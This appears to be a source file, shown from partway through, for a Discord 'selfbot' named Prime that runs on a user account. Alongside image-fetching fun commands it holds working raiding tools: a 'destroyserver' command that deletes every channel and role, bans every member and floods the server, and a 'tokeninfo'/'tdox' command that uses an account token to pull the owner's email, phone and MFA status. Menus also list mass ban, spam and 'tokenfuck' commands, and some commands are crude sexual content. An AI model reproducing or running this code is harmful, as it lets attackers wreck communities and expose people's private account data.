    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command()
async def slap(ctx, user: discord.Member): 
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command()
async def hug(ctx, user: discord.Member): 
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command()
async def logout(ctx):
    await ctx.message.delete()
    await bot.logout()
    print(f"{Fore.LIGHTMAGENTA_EX} logged out!")

@bot.command()
async def pat(ctx, user: discord.Member): 
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command()
async def kiss(ctx, user: discord.Member):
    await ctx.message.delete()
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@bot.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token):
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@bot.command()
async def ascii(ctx, *, text):
    await ctx.message.delete()
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@bot.command()
async def cum(ctx):
  await ctx.send('8=👊=D')
  time.sleep(1)
  await ctx.send('8==👊D')
  time.sleep(1)
  await ctx.send('8=👊=D')
  time.sleep(1) 
  await ctx.send('8==👊D')
  time.sleep(1)
  await ctx.send('8==👊D💦')
  time.sleep(1)
  await ctx.send('8=👊=D💦')

@bot.command()
async def backup(ctx):
    await ctx.message.delete()
    await bot.create_guild(f'backup of{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in bot.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:                
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@bot.command()
async def destroyserver(ctx):
    await ctx.message.delete()
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name="Prime ",
            description="Prime",
            reason="Prime",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name="Prime")
    for _i in range(250):
        await ctx.guild.create_role(name="Prime", color=RandomColor())
    print(f'Server Destroyed!')


@bot.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role):
    await ctx.message.delete()
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(0.1)
        except:
            break

@bot.command()
async def cock(ctx):
  await ctx.message.delete()
  await ctx.send(f'''

░░░░█─────────────█──▀──
░░░░▓█───────▄▄▀▀█──────
░░░░▒░█────▄█▒░░▄░█─────
░░░░░░░▀▄─▄▀▒▀▀▀▄▄▀─────
░░░░░░░░░█▒░░░░▄▀───────
▒▒▒░░░░▄▀▒░░░░▄▀────────
▓▓▓▓▒░█▒░░░░░█▄─────────
█████▀▒░░░░░█░▀▄────────
█████▒▒░░░▒█░░░▀▄───────
███▓▓▒▒▒▀▀▀█▄░░░░█──────
▓██▓▒▒▒▒▒▒▒▒▒█░░░░█─────
▓▓█▓▒▒▒▒▒▒▓▒▒█░░░░░█────
░▒▒▀▀▄▄▄▄█▄▄▀░░░░░░░█─

    ''')

@bot.command()
async def streaming(ctx, *, message):
    await ctx.message.delete()
    stream = discord.Streaming(
        name=message,
        url="https://www.twitch.tv/hentai", 
    )
    await bot.change_presence(activity=stream)

@bot.command()
async def listening(ctx, *, message):
    await ctx.message.delete()
    await bot.change_presence(
        activity=discord.Activity(
            type=discord.ActivityType.listening, 
            name=message,
        ))    

@bot.command()
async def cat(ctx):
    r = requests.get("https://some-random-api.ml/img/cat").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="cute cat :)") 
    embed.set_image(url=str(r["link"]))
    await ctx.send(embed=embed)
 
@bot.command()
async def dog(ctx):
    r = requests.get("https://some-random-api.ml/img/dog").json()
    embed = discord.Embed(color=RandomColor())
    embed.set_author(name="cute dog :)") 
    embed.set_image(url=str(r["link"]))
    await ctx.send(embed=embed)

@bot.command()
async def nsfw(ctx):
  await ctx.message.delete()
  embed=discord.Embed(title="Nsfw Menu", color=000)
  embed.set_author(name="Prime")
  embed.set_thumbnail(url="https://media.discordapp.net/attachments/774607971938336789/774649418531340388/Prime_logo_2.jpg")
  embed.add_field(name="anal", value="shows a img/gif of anal", inline=True)
  embed.add_field(name="boobs", value="shows a img/gif of boobs", inline=True)
  embed.add_field(name="hentai", value="shows a img/gif of hentai", inline=True)
  embed.add_field(name="feet", value="shows a img/gif of feet", inline=True)
  embed.add_field(name="blowjob", value="shows a img/gif of a blowjob", inline=True)
  embed.add_field(name="lesbian", value="shows a img/gif of lesbians", inline=True)
  embed.set_footer(text="Bounty Selfbot")
  await ctx.send(embed=embed)


@bot.command(pass_context=True)
async def proxy(ctx, arg1 = None):
    if arg1 is None:
        arg1 = "600"
    await ctx.message.delete()
    r = requests.post('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=600')
    await ctx.send(r.text)


@bot.command()
async def utility(ctx):
  await ctx.message.delete()
  embed=discord.Embed(title="Utility Menu", color=000)
  embed.set_author(name="Prime")
  embed.set_thumbnail(url="https://media.discordapp.net/attachments/774607971938336789/774649418531340388/Prime_logo_2.jpg")
  embed.add_field(name="`cls`", value="Cleans Console", inline=True)
  embed.add_field(name="`backup`", value="Creats Backup of a server")
  embed.add_field(name="`rainbow`", value="Makes a role rainbow")
  embed.add_field(name="`proxy`", value="generats socks5 proxys")
  embed.add_field(name="`ping`", value="pings a website")
  await ctx.send(embed=embed)

@bot.command()
async def settings(ctx):
  await ctx.message.delete()
  embed=discord.Embed(title="Settings Menu", color=000)
  embed.set_author(name="Prime")
  embed.set_thumbnail(url="https://media.discordapp.net/attachments/774607971938336789/774649418531340388/Prime_logo_2.jpg")
  embed.add_field(name="`logout`", value="logs out", inline=False)
  await ctx.send(embed=embed)

@bot.command()
async def raiding(ctx):
  await ctx.message.delete()
  embed=discord.Embed(title="Raiding Menu", color=000)
  embed.set_author(name="Prime")
  embed.set_thumbnail(url="https://media.discordapp.net/attachments/774607971938336789/774649418531340388/Prime_logo_2.jpg")
  embed.add_field(name="`spam`", value="spams a message", inline=True)
  embed.add_field(name="`tokenfuck`", value="Destroys a user", inline=True)
  embed.add_field(name="`tokeninfo`", value="Displays info on a token", inline=True)
  embed.add_field(name="`masschannel`", value="makes a ton  of channels", inline=True)
  embed.add_field(name="`massrole`", value="makes a ton of roles", inline=True)
  embed.add_field(name="`masskick`", value="kicks everyone possibe", inline=True)
  embed.add_field(name="`massban`", value="bans everyone possibe", inline=True)
  embed.add_field(name="`destroyserver`", value="Destroys a server", inline=True)
  embed.add_field(name="`massreact`", value="mass reacts")
  embed.add_field(name="`copycat`", value="copys everything a user says")
  embed.add_field(name="`scopycat`", value="stops copy cat")
  await ctx.send(embed=embed)


@bot.command()
async def pingweb(ctx, website=None):
    await ctx.message.delete()
    if website is None:
        pass
    else:
        try:
            r = requests.get(website).status_code
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}" + Fore.RESET)
        if r == 404:
            await ctx.send(f'Website is down ({r})', delete_after=3)
        else:
            await ctx.send(f'Website is operational ({r})', delete_after=3)


@bot.command(aliases=["copycatuser", "copyuser"])
async def copycat(ctx, user: discord.User):
    await ctx.message.delete()
    bot.copycat = user
    await ctx.send("copying " + str(bot.copycat))

@bot.command(aliases=["stopcopycatuser", "stopcopyuser", "stopcopy"])
async def scopycat(ctx):
    await ctx.message.delete()
    if bot.user is None:
        await ctx.send("your not coping anyone boi")
        return
    await ctx.send("Stopped copying " + str(bot.copycat))
    bot.copycat = None


@bot.command()
async def fun(ctx):
  await ctx.message.delete()
  embed=discord.Embed(title="Fun Menu", color=000)
  embed.set_author(name="Prime")
  embed.set_thumbnail(url="https://media.discordapp.net/attachments/774607971938336789/774649418531340388/Prime_logo_2.jpg")
  embed.add_field(name="`shrug`", value="shrugs", inline=True)
  embed.add_field(name="`lenny`", value="shows lenny", inline=True)
  embed.add_field(name="`tableflip`", value="flips table", inline=True)
  embed.add_field(name="`unflip`", value="unflips table", inline=True)
  embed.add_field(name="`dick`", value="Displays a users dick size", inline=True)
  embed.add_field(name="`av`", value="Displays a users avatar", inline=True)
  embed.add_field(name="`8ball`", value="answers your question", inline=True)
  embed.add_field(name="`username`", value="Generates a username", inline=True)
  embed.add_field(name="`embed`", value="embed your message", inline=True)
  embed.add_field(name="`kiss`", value="kisses a user", inline=True)
  embed.add_field(name="`pat`", value="pats a user", inline=True)
  embed.add_field(name="`hug`", value="hugs a user", inline=True)
  embed.add_field(name="`slap`", value="slaps a user", inline=True)
  embed.add_field(name="`ascii`", value="turns your text into ascii", inline=True)
  embed.add_field(name="`cum`", value="cums", inline=True)
  embed.add_field(name="`cock`", value="sends ascii art of a cock", inline=True)
  embed.add_field(name="`cat`", value="sends an image of a cat")
  embed.add_field(name="`dog`", value="sends an image of a dog")
  await ctx.send(embed=embed)

@bot.command()
async def user(ctx):
  await ctx.message.delete()
  embed=discord.Embed(title="User Menu", color=000)
  embed.set_author(name="Prime")
  embed.set_thumbnail(url="https://media.discordapp.net/attachments/774607971938336789/774649418531340388/Prime_logo_2.jpg")
  embed.add_field(name="`game`", value="changes status to playing", inline=True)
  embed.add_field(name="`watching`", value="changes status to watching", inline=True)
  embed.add_field(name="`listening`", value="changes your status to listening")
  embed.add_field(name="`streaming`", value="changes your status to streaming")
  embed.set_footer(text="Bounty Selfbot")
  await ctx.send(embed=embed)

@bot.command()
async def cls(ctx):
  await ctx.message.delete()
  Clear()
  main()


@bot.command()  
async def help(ctx):
  await ctx.message.delete()
  embed=discord.Embed(title="Help Menu", color=000)
  embed.set_author(name="Prime")
  embed.set_thumbnail(url="https://media.discordapp.net/attachments/774607971938336789/774649418531340388/Prime_logo_2.jpg")
  embed.add_field(name="`user`", value="shows user commands", inline=False)
  embed.add_field(name="`utility`", value="shows utility commands", inline=False)
  embed.add_field(name="`fun`", value="shows fun commands", inline=False)
  embed.add_field(name="`raiding`", value="shows raiding commands", inline=False)
  embed.add_field(name="`nsfw`", value="shows nsfw commands", inline=False)
  embed.add_field(name="`settings`", value="shows settings commands", inline=False)
  embed.set_footer(text="Bounty Selfbot")
  await ctx.send(embed=embed)



bot.run(token, bot=False)


